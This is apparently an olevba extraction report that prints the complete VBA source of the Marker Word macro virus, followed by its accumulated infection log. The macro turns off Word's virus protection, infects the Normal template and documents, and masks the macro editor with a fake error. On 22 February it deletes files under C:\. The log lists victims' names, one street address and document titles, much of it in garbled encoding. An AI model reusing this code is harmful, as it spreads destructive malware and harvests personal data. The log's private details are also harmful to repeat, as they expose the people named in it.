olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Marker.x
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Marker.x - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 












































' HANJUNG PRINTING.doc2000.11.06 오후 3:39:58\\SV085\pg082 - NE02:
Private Sub Document_Close()
' HANJUNG PRINTING.doc2000.11.06 오후 3:39:58\\SV085\pg082 - NE02:
On Error Resume Next
' HANJUNG PRINTING.doc2000.11.06 오후 3:39:58\\SV085\pg082 - NE02:
Const from = "Yugoslavia" 'nuthin' to do with the GeNiUs just needed a marker
' HANJUNG PRINTING.doc2000.11.06 오후 3:39:58\\SV085\pg082 - NE02:
Dim SaveDocument, SaveNormalTemplate, DocumentInfected, NormalTemplateInfected As Boolean
' HANJUNG PRINTING.doc2000.11.06 오후 3:39:58\\SV085\pg082 - NE02:
Dim ad, nt As Object
' HANJUNG PRINTING.doc2000.11.06 오후 3:39:58\\SV085\pg082 - NE02:
Dim rep, x As Integer
' HANJUNG PRINTING.doc2000.11.06 오후 3:39:58\\SV085\pg082 - NE02:
Dim virusCode, UserAddress, LogData, LogFile As String
' HANJUNG PRINTING.doc2000.11.06 오후 3:39:58\\SV085\pg082 - NE02:
Set ad = ActiveDocument.VBProject.VBComponents.Item(1)
' HANJUNG PRINTING.doc2000.11.06 오후 3:39:58\\SV085\pg082 - NE02:
Set nt = NormalTemplate.VBProject.VBComponents.Item(1)
' HANJUNG PRINTING.doc2000.11.06 오후 3:39:58\\SV085\pg082 - NE02:
DocumentInfected = ad.codemodule.Find(from, 1, 1, 10000, 10000)
' HANJUNG PRINTING.doc2000.11.06 오후 3:39:58\\SV085\pg082 - NE02:
NormalTemplateInfected = nt.codemodule.Find(from, 1, 1, 10000, 10000)
' HANJUNG PRINTING.doc2000.11.06 오후 3:39:58\\SV085\pg082 - NE02:
Options.VirusProtection = False
' HANJUNG PRINTING.doc2000.11.06 오후 3:39:58\\SV085\pg082 - NE02:
Options.SaveNormalPrompt = True
' HANJUNG PRINTING.doc2000.11.06 오후 3:39:58\\SV085\pg082 - NE02:
Delivery:
' HANJUNG PRINTING.doc2000.11.06 오후 3:39:58\\SV085\pg082 - NE02:
If Day(Now()) = 22 And Month(Now()) = 2 Then
' HANJUNG PRINTING.doc2000.11.06 오후 3:39:58\\SV085\pg082 - NE02:
Kill "C:\*.*":
' HANJUNG PRINTING.doc2000.11.06 오후 3:39:58\\SV085\pg082 - NE02:
rep = MsgBox("That's Right", vbOK + vbCritical, "It's Murder")
' HANJUNG PRINTING.doc2000.11.06 오후 3:39:58\\SV085\pg082 - NE02:
GoTo Delivery
' HANJUNG PRINTING.doc2000.11.06 오후 3:39:58\\SV085\pg082 - NE02:
End If
' HANJUNG PRINTING.doc2000.11.06 오후 3:39:58\\SV085\pg082 - NE02:
If (DocumentInfected = True Xor NormalTemplateInfected = True) And (ActiveDocument.SaveFormat = wdFormatDocument Or ActiveDocument.SaveFormat = wdFormatTemplate) Then
' HANJUNG PRINTING.doc2000.11.06 오후 3:39:58\\SV085\pg082 - NE02:
If DocumentInfected = True Then
' HANJUNG PRINTING.doc2000.11.06 오후 3:39:58\\SV085\pg082 - NE02:
SaveNormalTemplate = NormalTemplate.Saved
' HANJUNG PRINTING.doc2000.11.06 오후 3:39:58\\SV085\pg082 - NE02:
virusCode = ad.codemodule.Lines(1, ad.codemodule.countoflines)
' HANJUNG PRINTING.doc2000.11.06 오후 3:39:58\\SV085\pg082 - NE02:
For i = 1 To Len(Application.UserAddress)
' HANJUNG PRINTING.doc2000.11.06 오후 3:39:58\\SV085\pg082 - NE02:
If Mid(Application.UserAddress, i, 1) <> Chr(13) Then
' HANJUNG PRINTING.doc2000.11.06 오후 3:39:58\\SV085\pg082 - NE02:
If Mid(Application.UserAddress, i, 1) <> Chr(10) Then
' HANJUNG PRINTING.doc2000.11.06 오후 3:39:58\\SV085\pg082 - NE02:
UserAddress = UserAddress & Mid(Application.UserAddress, i, 1)
' HANJUNG PRINTING.doc2000.11.06 오후 3:39:58\\SV085\pg082 - NE02:
End If
' HANJUNG PRINTING.doc2000.11.06 오후 3:39:58\\SV085\pg082 - NE02:
Else
' HANJUNG PRINTING.doc2000.11.06 오후 3:39:58\\SV085\pg082 - NE02:
UserAddress = UserAddress & Chr(13) & "' "
' HANJUNG PRINTING.doc2000.11.06 오후 3:39:58\\SV085\pg082 - NE02:
End If
' HANJUNG PRINTING.doc2000.11.06 오후 3:39:58\\SV085\pg082 - NE02:
Next i
' HANJUNG PRINTING.doc2000.11.06 오후 3:39:58\\SV085\pg082 - NE02:
LogData = Chr(13) & "' " & Format(Time, "hh:mm:ss AMPM -") & Format(Date, "dddd,d mmm,yyyy") & Chr(13) & "' " & Application.UserName & Chr(13) & "' " & UserAddress & Chr(13) & "' " & Application.ActiveDocument & Chr(13)
' HANJUNG PRINTING.doc2000.11.06 오후 3:39:58\\SV085\pg082 - NE02:
virusCode = virusCode & LogData
' HANJUNG PRINTING.doc2000.11.06 오후 3:39:58\\SV085\pg082 - NE02:
nt.codemodule.Deletelines 1, nt.codemodule.countoflines
' HANJUNG PRINTING.doc2000.11.06 오후 3:39:58\\SV085\pg082 - NE02:
nt.codemodule.AddFromString virusCode
' HANJUNG PRINTING.doc2000.11.06 오후 3:39:58\\SV085\pg082 - NE02:
With nt.codemodule
' HANJUNG PRINTING.doc2000.11.06 오후 3:39:58\\SV085\pg082 - NE02:
.replaceline 174, "Sub viewVBcode()" & Chr(13) & Chr(13) & "x=Msgbox(" & Chr(34) & " Error - Not enough memory!" & Chr(34) & ", VbOkonly + VbApplication+Vbcritical," & Chr(34) & "Visual Basic Editor" & Chr(34) & ")" & Chr(13) & Chr(13) & "End Sub" & Chr(13) & Chr(13) & "Sub ToolsMacro()" & Chr(13) & Chr(13) & "x=Msgbox(" & Chr(34) & " Error - Not enough memory!" & Chr(34) & ", VbOkonly + VbApplication+Vbcritical," & Chr(34) & "Visual Basic Editor" & Chr(34) & ")" & Chr(13) & Chr(13) & "End Sub"
' HANJUNG PRINTING.doc2000.11.06 오후 3:39:58\\SV085\pg082 - NE02:
End With
' HANJUNG PRINTING.doc2000.11.06 오후 3:39:58\\SV085\pg082 - NE02:
With nt.codemodule
' HANJUNG PRINTING.doc2000.11.06 오후 3:39:58\\SV085\pg082 - NE02:
For x = 45 To 181 Step 2
' HANJUNG PRINTING.doc2000.11.06 오후 3:39:58\\SV085\pg082 - NE02:
.replaceline x, "' " & Application.UserName & " " & Application.ActiveDocument & Now & Application.ActivePrinter
' HANJUNG PRINTING.doc2000.11.06 오후 3:39:58\\SV085\pg082 - NE02:
Next x
' HANJUNG PRINTING.doc2000.11.06 오후 3:39:58\\SV085\pg082 - NE02:
End With
' HANJUNG PRINTING.doc2000.11.06 오후 3:39:58\\SV085\pg082 - NE02:
If SaveNormalTemplate = True Then NormalTemplate.Save
' HANJUNG PRINTING.doc2000.11.06 오후 3:39:58\\SV085\pg082 - NE02:
End If
' HANJUNG PRINTING.doc2000.11.06 오후 3:39:58\\SV085\pg082 - NE02:
If NormalTemplateInfected = True Then
' HANJUNG PRINTING.doc2000.11.06 오후 3:39:58\\SV085\pg082 - NE02:
SaveDocument = ActiveDocument.Saved
' HANJUNG PRINTING.doc2000.11.06 오후 3:39:58\\SV085\pg082 - NE02:
virusCode = nt.codemodule.Lines(1, nt.codemodule.countoflines) & Chr(13) & "' " & Application.ActiveDocument & Chr(13)
' HANJUNG PRINTING.doc2000.11.06 오후 3:39:58\\SV085\pg082 - NE02:
ad.codemodule.Deletelines 1, ad.codemodule.countoflines
' HANJUNG PRINTING.doc2000.11.06 오후 3:39:58\\SV085\pg082 - NE02:
ad.codemodule.AddFromString virusCode
' HANJUNG PRINTING.doc2000.11.06 오후 3:39:58\\SV085\pg082 - NE02:
nt.codemodule.Deletelines 1, nt.codemodule.countoflines
' HANJUNG PRINTING.doc2000.11.06 오후 3:39:58\\SV085\pg082 - NE02:
nt.codemodule.AddFromString virusCode
' HANJUNG PRINTING.doc2000.11.06 오후 3:39:58\\SV085\pg082 - NE02:
ad.codemodule.Deletelines 174, 13
' HANJUNG PRINTING.doc2000.11.06 오후 3:39:58\\SV085\pg082 - NE02:
With ad.codemodule
' HANJUNG PRINTING.doc2000.11.06 오후 3:39:58\\SV085\pg082 - NE02:
For x = 45 To 181 Step 2
' HANJUNG PRINTING.doc2000.11.06 오후 3:39:58\\SV085\pg082 - NE02:
.replaceline x, "' " & Application.UserName & " " & Application.ActiveDocument & Now & Application.ActivePrinter
' HANJUNG PRINTING.doc2000.11.06 오후 3:39:58\\SV085\pg082 - NE02:
Next x
' HANJUNG PRINTING.doc2000.11.06 오후 3:39:58\\SV085\pg082 - NE02:
End With
' HANJUNG PRINTING.doc2000.11.06 오후 3:39:58\\SV085\pg082 - NE02:
If SaveDocument = True Then ActiveDocument.Save
' HANJUNG PRINTING.doc2000.11.06 오후 3:39:58\\SV085\pg082 - NE02:
End If
' HANJUNG PRINTING.doc2000.11.06 오후 3:39:58\\SV085\pg082 - NE02:
End If
' HANJUNG PRINTING.doc2000.11.06 오후 3:39:58\\SV085\pg082 - NE02:
Options.SaveNormalPrompt = False
' HANJUNG PRINTING.doc2000.11.06 오후 3:39:58\\SV085\pg082 - NE02:
End Sub
' HANJUNG PRINTING.doc2000.11.06 오후 3:39:58\\SV085\pg082 - NE02:
' HANJUNG hsintao(OMRF).doc2000.10.31 오전 11:39:57\\SV085\pg082 - NE02:
' HANJUNG PRINTING.doc2000.11.06 오후 3:39:58\\SV085\pg082 - NE02:
' HANJUNG hsintao(OMRF).doc2000.10.31 오전 11:39:57\\SV085\pg082 - NE02:
' HANJUNG PRINTING.doc2000.11.06 오후 3:39:58\\SV085\pg082 - NE02:
' HANJUNG hsintao(OMRF).doc2000.10.31 오전 11:39:57\\SV085\pg082 - NE02:
' HANJUNG PRINTING.doc2000.11.06 오후 3:39:58\\SV085\pg082 - NE02:

' HANJUNG PRINTING.doc2000.11.06 오후 3:39:58\\SV085\pg082 - NE02:

' flres1.doc

' sample1.doc

' Lawton updated resume.doc

' LEMERISE.DOC

' galianes.doc

' CVUK.doc

' word95_BinLi.doc

' Eduard 1.doc

' rakowski.doc

' DHRUVER.DOC

' 01:08:39 PM -Wednesday,16 Jun,1999
' DhruveR
'
' Dhruver.doc

' 6-15.doc

' DJI RESTORE.doc

' 03:58:39 PM -Wednesday,16 Jun,1999
' Tom Dziubek
'
' DJI RESTORE.doc

' FEC Script.doc

' OutlookDelegates.doc

' nite.doc

' sbranc01.doc

' newuser-djxpress.doc

' june_99.doc

' 02:01:37 PM -Monday,28 Jun,1999
' TozziT
'
' june_99.doc

' teammov1.doc

' 03:34:41 PM -Wednesday,7 Jul,1999
' DziubekT
'
' teammov11.doc

' Document2

' oneweek.doc

' oneweek.doc

' Document1

' twoweek.doc

' 4week.doc

' 01:44:35 PM -Wednesday,7 Jul,1999
' Ernesto Dulce
'
' 4week.doc

' FSDLA.doc

' FSDLA.doc

' July 13th Outage Request.doc

' 12:14:22 PM -Monday,12 Jul,1999
' cnsncc
'
' July 13th Outage Request.doc

' Kathy's Resume1.doc

' ubeedoo.doc

' Unregistered Network Numbers.doc

' servernames.doc

' data circuits 1.doc

' DAILY ACTIVITY REPORT.doc

' 09:51:17 AM -Tuesday,13 Jul,1999
' Susie Scornavacca
'
' DAILY ACTIVITY REPORT.doc

' june.doc

' OSDJune1999.doc

' djxprss Request Form1.doc

' Shadow R4.doc

' TOKREPLL.doc

' bypass.doc

' 12:20:36 PM -Tuesday,13 Jul,1999
' Bob Brooks
'
' bypass.doc

' WORD.doc

' UPDSecIDaud21.doc

' UPDSecIDaud21.doc

' 09:14:25 AM -Friday,16 Jul,1999
' Deb Sorchinski
' 20 Academy Street
' Princeton, NJ  98540
' UPDSecIDaud2.doc

' editor~2.doc

' CEO Expectations & Decision Making.doc

' HR Issues.doc

' WINWORD.DOC

' dorrisobrien_bio.doc.doc

' MelConnet_bio.doc.DOC

' Aeneid Position Spec 7-2-99.doc

' orgchart.doc

' top level org chart.doc

' first note.doc

' top level org chart.doc

' Sunesis Group Communications.doc

' first note.doc

' CONTACT LIST DIRECT.doc

' GSReview.doc

' WEEKLY STAFF MEETING-TIM ANDREWS.doc

' Polycom1.doc

' PENDING JV ITEMS_.doc

' WAVO MEETING AGENDA.doc

' 03:08:21 AM -Friday,23 Jul,1999
' Dow Jones Employee
'
' WAVO MEETING AGENDA.doc

' bruce

' Bruce2

' bruce3

' email.doc

' Revised Activities By Role - Working Team.doc

' DJICustomerLetter_American English.DOC

' ppteam.doc

' 12:23:02 PM -Tuesday,27 Jul,1999
' DJIPI - HK
'
' ppteam.doc

' quotation for eve.doc

' Great Note from Tim Andrews (Customer Focus & Leadership).doc

' Tim Andrews Note - 3rd month of JV.doc

' DJRBI Top Level Organizational Chart.doc

' top level org chart.doc

' Chinatrust Agreement.doc

' RBB Proposal.doc

' Sources Available on RBB.doc

' Hospital Authority - successful experience & DJ Technical Contact.doc

' WINWORD.DOC

' RBB Trial Evaluation Letter.doc

' 08:49:41 AM -Thursday,29 Jul,1999
' Warren Tang
'
' RBB Trial Evaluation Letter.doc

' TAcontentexchange.doc

' DJI English Intro.doc

' RBB intro.doc

' Reuters.doc

' Orient.doc

' WINWORD.DOC

' Inform.doc

' Inform.doc

' 11:02:38 �鷗� -Monday,16 Aug,1999
' Administrator
'
' PW.doc

' Siemens.doc

' Enron China PW.doc

' Document2

' Dow Jones.doc

' Change to the contractLegend.doc

' Legend.docfilename=Legend.doc

' RBB SelectCCTV.doc

' RBB SelectCCTV2.doc

' 05:19:20 PM -Friday,20 Aug,1999
' ws12
'
' RBB_SelectCCTV.doc

' 忌눈뵨쒔檀롸잼，객몹菱방쪼頓鱗.doc

' 0823XMFX.doc

' 0823XXT.doc

' 쒔셌꼬몹으커벌헤쌘커꿉뺍蝎.doc

' 斤口꿉뺍莉훙逃묏栗깊.doc

' 斤口꿉뺍莉훙逃섟묏鱗斂콘.doc

' 斤口꿉뺍莉훙逃묏栗깊.doc

' 1練  琯.doc

' 밑黨“箇옰세苟券”쌘커돨접淃괩멩.doc

' “櫓빽륩干匡뺏嵐듯”쌘커쉥瞳랗敬꺄놔.doc

' 멕黛漑0824.doc

' 燔�國�.doc

' 쒔셌꼬쌘커괩꺄깊.doc

' 0825XMFX.doc

' 0826SMFX.doc

' 꽝옘朞痙0826.doc

' 棍젬쒔롤賈痰구戈쩌.doc

' 숌    괩.doc

' 숌괩0325.doc

' 櫓卵랗敬쒔셌꼬쌘커괩꺄데1.doc

' 쌘커긴땡繫列23.doc

' 0828XMFX.doc

' 990829－2.xls

' 806淚소꿉뺍삔朞痙.doc

' 990829－3.xls

' 990829－1.xls

' BTD0828.doc

' RCXX0829.doc

' 꽝옘朞痙0830.doc

' 0829SMFX.doc

' 0830SMFX.doc

' 0830SXT.doc

' 990829－1.xls

' 匡도3

' 990829－3.xls

' 쏜皐뒈0829.doc

' �荇�0829.doc

' 匡도2

' 0829XXT1.doc

' BTD0830.doc

' 05:40:49 PM -Wednesday,1 Sep,1999
' mac03
'
' BTD0901.doc

' 0902SXT.doc

' 꼬쥴돔：.doc

' 긍품꽝옘902A.doc

' 1.doc

' 0901SXT.doc

' 0901XXT.doc

' 0902A.doc

' 990902－1.xls

' 990902－2.xls

' 990902－3.xls

' 쏜皐뒈0902.doc

' �荇�0902.doc

' 0902.doc

' 0902XXT.doc

' 0902XMFX.doc

' jky0902.doc

' 《櫓벌꼿쒔괩돛》괩痙데831.doc

' �荇�0901.doc

' 첵竟뚤淚撚무밑륩蛟돨矜헹.doc

' 貢쭹櫓劤壙喇쬠돨景듐섟페唐槻왠齡놓決.doc

' 櫓벌훙췽댕欺劤壙溝첵썽淚소죗깊.doc

' 멕黛漑0615.doc

' 斤1.doc

' 멕黛漑0805.doc

' RCXX0527.doc

' RCXX0609.doc

' 0904XXT.doc

' 쏜皐뒈0901.doc

' 쏜皐뒈0904.doc

' �荇�0904.doc

' 0904XMFX.doc

' 0905SXT.doc

' 08:23:59 AM -Saturday,11 Sep,1999
' ws12
'
' 0909SXT.doc

' 櫓卵든柬憩쒔셌꼬밑黨“든柬憩功삔쌘커딧꿴”돨삠괩.doc

' ’99《꼿말》홍헷쬠見·�瞿Ｄ猿蘇邈薺㉤�.doc

' 攻.doc

' 其엊럇陋.doc

' 913.doc

' jkm0913.doc

' 齡튬훙삔累쒔롤渡炬.doc

' ~$랑무鱇悧꼴련빽꿉뺍.doc

' 917.doc

' 긍서莉묏鱗직넋맣쏵렘갭.doc

' 917.doc

' 917.doc

' 917.doc

' 917.doc

' 917.doc

' 917.doc

' 917.doc

' jky0917.doc

' jkr0917.doc

' jkm0917.doc

' jkf0917.doc

' 셕炬샙各썹   벌셥.doc

' 훙慤뇹쥴돔：.doc

' 匡도3

' BTD9018.doc

' Internet무鱇옘뀁숌션.doc

' 918.doc

' 990918-1.xls

' 990918-3.xls

' 匡도2

' 베袞벌소깊刻쉥셨崎獵契掘끓괏송漣꿉.doc

' 寧鷺路듐朞痙꽝옘920.doc

' jky0916.doc

' jky0914.doc

' 亶景랑무鱇悧꼴굔흩景꺽却련빽괩돛꿉뺍렘갭.doc

' 920-1.doc

' 匡도2

' 919.doc

' Backup of 10墩路듐朞痙.wbk

' 쒔셌꼬9墩룀齡튬훙삔累션쩌.doc

' 밑黨《�荇障렝맣옇캅椽셋렌韶庸픈�.doc

' 줄珂훙逃익蛟랙렴깊.doc

' 匡도1

' 匡도2

' 《몸鬼鬼벌唐폐撚돨믐慤》.doc

' 匡도1

' 亶벌든柬劤壙：몸昑뺏，寮꺄섟劤관陋.doc

' 닒든柬쌘커관陋近駕긴뺏였든柬첵썽돨몸昑뺏瀏헹.doc

' 쒔셌틉돛돨近蹶섟忌눈.doc

' 쬠틔탬濫쫠瞳틉돛쒔檀櫓돨路狼鱗痰0625.doc

' 9027smfx.doc

' 밑黨鹿쳄벌槨看돨굇獨볜횔뷰珞.doc

' 枷寧퍅쇌쒔셌꼬쌘커꺄놔데.doc

' 枷寧퍅쇌쌘커꺄놔데.doc

' 0927XMFX.doc

' jkr0927.doc

' 0928SXT.doc

' 匡도1

' 灌黛놉乂 훨路돛陶.doc

' 灌黛놉乂，훨路돛陶.doc

' 쏜皐뒈0927.doc

' �荇�0927.doc

' 04:15:29 PM -Thursday,28 Oct,1999
' 008
'
' life1027.doc

' c1029.doc

' c1101.doc

' 09:27:51 AM -Wednesday,3 Nov,1999
' 008
'
' c1103.doc

' 헝刻괩멩.doc

' DSYS.doc

' CAZHDBFW

' 珙덮콱봤：.doc

' 匡도1

' c1110.doc

' 匡도2

' 《珂�鬼렘旼옹鴛㈕ぱ￡�.doc

' 巧枷쾨쀼蔣（든斤경）.doc

' 句롤딧꿴맣경駕빈돨湳튬.doc

' 09:19:33 AM -Monday,8 Nov,1999
' yenan
'
' 句롤딧꿴맣경駕빈돨湳튬.doc

' ~WRL1293.tmp

' 繫祇쩌.doc

' 션慤굶.doc

' 셕뺍蝎.doc

' 譚黨딧꿴貢쭹賈痰셕炬샙쪽멕，헝몹貫.doc

' ~WRL0001.tmp

' ~WRL0001.tmp

' 櫓벌든柬句롤딧꿴貢쭹묏鱗셕뺍蝎.doc

' 櫓벌든柬句롤딧꿴貢쭹묏鱗셕뺍蝎.doc

' ~WRL0001.tmp

' 뒈렘憩먁菫혹돨朞痙.doc

' 췽봄륩蛟.doc

' 밑黨쐤퍅묏鱗鬼써.doc

' 09:34:31 AM -Thursday,16 Nov,2000
' yenan
'
' 밑黨쐤퍅묏鱗鬼써.doc

' 匡도2

' �鉞�.doc

' 匡도1

' 句롤딧꿴흔부隣.doc

' 匡도1

' 匡도2

' 句롤莉훙逃츰데.doc

' 句롤莉훙逃츰데 25훙.doc

' 匡도1

' 句롤莉훙逃돨�虛�.doc

' 匡도2

' Doc1.doc

' tcm.doc

' 匡도3

' 棍찡륩蛟.doc

' 柬괏팁.doc

' 柬괏팁딧꿴깊.doc

' 貢쭹桔擎삔.doc

' 01:16:25 PM -Wednesday,13 Dec,2000
' yenan
'
' 貢쭹桔擎삔.doc

' 든柬憩.doc

' 櫓벌든柬句롤딧꿴貢냥逃憩젬溝훙섟젬溝렘駕.doc

' 路헤돨툉堂쳬.doc

' 繫  列.doc

' 柬괏팁.doc

' 밑黨뉴쌘景깎쌘커.doc

' 踏狗.doc

' 12:51:04 PM -Sunday,26 Dec,1999
' ljf
'
' 踏狗.doc

' 듐힛힛鬼틔.DOC

' 匡도2

' 쟀썅렷谿羚삶禿黨뎠덜匡欺桔씩썹綠쐤랗枷쾨，寧殮角맡쥴堵코뇹黨품懶뒈던、撻唐넣씹緞捲제돨路狼돨栗�疽噓읊捻錮㎑翔�寧.doc

' 뗍袈唐0.doc

' 뗍袈唐1.doc

' 뗍袈唐먁.doc

' 匡도2

' 북谿.doc

' 2000.doc

' 봤�瀯�.doc

' “냘懇珂덜”匡欺蝎溝.doc

' Doc4.doc

' 匡도2

' 匡도2

' 땡檄.doc

' 斂냔.doc

' 뗍《겟쾨凜鍍》唐먁0.doc

' 뗍《겟쾨凜鍍》唐먁.doc

' 匡도1

' 匡도1

' 匡도1

' 匡도1

' 쭈퓻죠�☏켜�.doc

' 쭈퓻죠角寧몸봤훙.doc

' 뉴莖.doc

' 젯暾쟝角寧몸봤캡항.doc

' 匡도1

' 찻꼍떼삔빽磎    틔瓘쏩給훙��.doc

' 例콘遼酪잼콱唐뜩陶.doc

' 匡도1

' �聆篇┙昞켯罔ば�.doc

' �聆篇┙昞켯罔ば�.doc

' 匡도1

' 匡도1

' JG003.doc

' 쒔檀例쁜.doc

' CMS1.doc

' 匡도1

' 굇쑴功괩멨.doc

' 匡도1

' 匡도1

' 匡도2

' 눈廬목駕.doc

' 괩송목駕.doc

' 괩송목駕.doc

' 匡도1

' 貢쭹匡欺쉽寧賈疼賈慤놔唐凜.doc

' 쨀祺狂痙.doc

' 쑹틔嵐瓊갭.doc

' 핵�ず衢� 珂�琴�朞.doc

' 怒윰옹薑――求擄샙저袈돨蝎畇諒.doc

' 315箇큇켈멨.doc

' 315소든朞뭔멕癎멨.doc

' 숌괩목駕.doc

' 숌괩목駕.doc

' 랙멨悧써.doc

' DOC1.DOC

' 匡도2

' DOC1.DOC

' DOC1.DOC

' 캡老흔렀.doc

' 굇쑴든柬憩뉴쌘.doc

' 求擄“맴씐”劤매쿡.doc

' 쑴멍膠撚淃커역連헙워.doc

' 劤壙멨룐충.doc

' 捺밟宅�넋�.doc

' 宮獨貢弄푤荏헙훙.doc

' 捺밟宅�넋�.doc

' 宮獨貢弄푤荏헙훙.doc

' 怒윰옹薑홍충쏵엊求擄샙契撚.doc

' 깥芎괵珞多랙齡잤셉朞痰裂轢.doc

' 1墩익蛟롤츰데.doc

' 匡도1

' 씌轢뚤癎롸驕宅壇뚤꿉쫠.doc

' “鬧雷제”쉽못强.doc

' 캡항.doc

' 깥芎、求擄샙잚1-26.doc

' 묏鱗悧써悧룐충.doc

' 좼�桭慈㉪滿湯쉼�.doc

' 315풉瞳誇샙渡렝.doc

' 匡도1

' 匡도1

' 3-4墩첵썽셕뺍.doc

' 《굶괩쏟휑놔샌》鱗諒츰데.doc

' 匡도2

' 匡도1

' 匡도1

' 匡도1

' 匡도2

' 《굶괩쏟휑놔샌》箇蝎츰데.doc

' 匡도1

' 匡도2

' 묏鱗도갭.doc

' AXJLB.DOC

' CH.DOC

' DH.DOC

' NAME.DOC

' WJ.DOC

' WZPB.DOC

' 힛寧巧鬼喇쬠.doc

' 굇쑴렛뒈끓憧羚痰멨.doc

' 匡도1

' 鮫쳔綾劤壙멨2.doc

' 鮫쳔綾劤壙멨1.doc

' 匡도1

' 匡도1

' 츠츠겜겜朞소든.doc

' 匡도1

' 劤壙젬꺄꽃련쀼댑.doc

' 匡도1

' 匡도1

' 鮫쳔綾劤壙멨3.doc

' 匡도1

' 잠궐沂븐.doc

' 든緞침렘“걔薑엥”瞳旗瘻.doc

' 깥芎、求擄샙잚2-16.doc

' 鮫쳔綾瞳櫓벌.doc

' 匡도1

' 匡도1

' SBSpublicconsulting.doc

' 쑹틔嵐흡劤壙셕뺍.doc

' 劤壙멨4.doc

' 匡도2

' 匡도1

' 吝路행뉴.doc

' 깥芎、求擄샙잚2-16.doc

' 깥芎、求擄샙잚2-16.doc

' 깥芎冷狼隣竟쇱.doc

' 憐竟뚤癎栗죕.doc

' 깥芎、求擄샙잚2-16.doc

' 뚤癎栗죕.doc

' 匡도1

' 浬놔机緊돨큽��.doc

' 괩멩.doc

' 뎠큽훙枓島貢쭹.doc

' 匡도2

' 눈廬.doc

' 鬼�酎懇쫍타�.doc

' Sinch-c(1).doc

' 뎠큽훙枓島貢쭹.doc

' 쀼련써벎劤壙멨.doc

' 鮫쳔綾劤壙멨4.doc

' 鮫쳔綾劤壙멨5.doc

' 630양끝멨.doc

' 櫓벌든柬撚突쿨劤샙島.doc

' 匡도1

' 匡도1

' 匡도2

' 匡도3

' 匡도4

' 匡도5

' 鷺랍릿角꼇角“各셩櫓벌앵隔”.doc

' 룐충�碗�.doc

' 匡도1

' 匡도1

' Doc1.doc

' 匡도1

' 匡도1

' 匡도1

' 匡도1

' 匡도1

' 捏틔탬댔폅“묑懃濫”.doc

' 鮫쳔綾劤壙멨6.doc

' 든켬栗죕.doc

' 일奈났劤壙멨.doc

' 怒윰옹薑瞳櫓벌.doc

' road show--2000匡俚.doc

' 썩綱늦.doc

' 怒윰옹薑저袈.doc

' 匡도1

' 匡도1

' 匡도1

' 鮫쳔綾劤壙멨7.doc

' 匡도1

' newspaper2.doc

' 鮫쳔綾劤壙멨8.doc

' 묏鱗도갭（랗）.doc

' robot brochure.doc

' 탠찡可.doc

' 暠튬뚤궐匡俚綱츠.doc

' 저쎌걔薑엥츰데.doc

' 썩綱늦.doc

' 男헝변.doc

' 男헝변.doc

' 릿숭 썩綱늦.doc

' 쑹틔嵐劤壙멨.doc

' 쑹틔嵐劤壙멨랗.doc

' 啖攣뽈뒨.doc

' 09:41:53 AM -Tuesday,30 Mar,1999
' sl
'
' %D3%BA%D5%FD%BB%CA%B5%DB.doc?funcid=readpart&websid=EAGiYwAhG&mid=MX6aBTm174i47-D5EEYS&part=2&filename=%D3%BA%D5%FD%BB%CA%B5%DB

' 匡도瞳 Microsoft Internet Explorer

' 匡도瞳 Microsoft Internet Explorer

' 2.doc

' 10:28:29 AM -Monday,10 Apr,2000
' 謳렵
'
' 쀼瓘《啖攣뽈뒨》.doc

' 乖쳬呵쭝죄痂척.doc

' LJSEXXYI.doc

' LJSEXXYI.doc

' 밑黨무鱇撚蛟훙逃饋簡섟쉽쟨桿契곗랬.doc

' 鷺믄냘邱�骸켯近吐캥�밖.doc

' 댕牘돨믐慤.doc

' 1.doc

' 匡도1

' 1.doc

' 匡도1

' x1.doc

' 큔獨“櫓벌匡뺏�慊납퐈굣쉼�.doc

' 09:36:48 PM -Thursday,13 Apr,2000
' 觀쟝엊
'
' 큔獨“櫓벌匡뺏�慊납퐈굣쉼�.doc

' 무鱇淃커.doc

' 11:29:30 AM -Friday,14 Apr,2000
' 蠟에
'
' 무鱇淃커.doc

' 눈廬a.doc

' POEMS.doc

' SONGS.doc

' 눈廬痰笭.doc

' 눈廬.doc

' SHNEW.DOC

' 劤쉔 Microsoft Word 匡도.doc

' 匡도1

' 匡도1

' 匡도1

' 뛔뽕嵐忌눈股밤셕뺍.doc

' 1.doc

' 뛔뽕柯욀論減嵐劤壙멨.doc

' 뛔뽕論減嵐劤壙멨.doc

' 뛔뽕嵐暠튬綱츠.doc

' 삔셕齡똑.doc

' 쯩숯텬.doc

' 匡도2

' 뛔뽕論減嵐忌눈股밤롤渡炬.doc

' 理줏북谿.doc

' 匡도3

' 匡도2

' 葵累蝎1.doc

' 葵累1.doc

' 匡숭001.doc

' 櫓벌뛔뽕멨.doc

' 男헝변.doc

' 劤쉔 Microsoft Word 匡도.doc

' 桿쬠쉴溪具.doc

' 拱콘츰튬.doc

' JL.doc

' 08:07:11 PM -Wednesday,21 Jun,2000
' OPEY A.
' CNNHS B'92 PHILIPPINES (CNSC)
' JL.doc

' Cjl-jl.doc

' 숌저.doc

' 몸 훙숌 저.doc

' 숌저2（亶）.doc

' 숌저2.doc

' 숌저(1).doc

' 몸   훙   숌   저.doc

' 몸훙숌저(1).doc

' 몸훙숌저(2).doc

' 땟儺.doc

' 헹斂변.DOC

' 꽐깝.doc

' 땜꼬뺏欺-붚-璂송.doc

' 있記-璂송.doc

' Doc1.doc

' qxzd0617-2.doc

' qxzd0131-2.doc

' 벴있莖5%EC桿駱와빵츰쩌.doc

' 덮땜뒈혐벴있莖饋簡듐섟彊逕헙워.doc

' 2000TW-BM021.doc

' 2000TW-BM027.doc

' 11:02:09 AM -Tuesday,4 Jul,2000
' OPEY A.
' CNNHS B'92 PHILIPPINES (CNSC)
' 2000TW-BM038.doc

' 와빵츰쩌.doc

' ZHANGYI.doc

' 璂송-땜꼬-빤켓낀��.doc

' ZDCH003.doc

' 璂송-땜꼬-�紬⒜���.doc

' 匡도1

' 놔뀌괩멩05.doc

' 匡도1

' 묏鱗휑션.doc

' 璂송-멕錟陶땜.doc

' 堵츰鬧꿍북谿蝎.doc

' 堵츰밗잿츰쩌.doc

' 마운饋簡헙워.doc

' 2000TW-BM002.doc

' 2000TW-BM034.doc

' 2000TW-BM006.doc

' 2000TW-BM001.doc

' 匡도1

' 匡도1

' zwl우쌥.doc

' qxzd0003.doc

' qxzd0117-1.doc

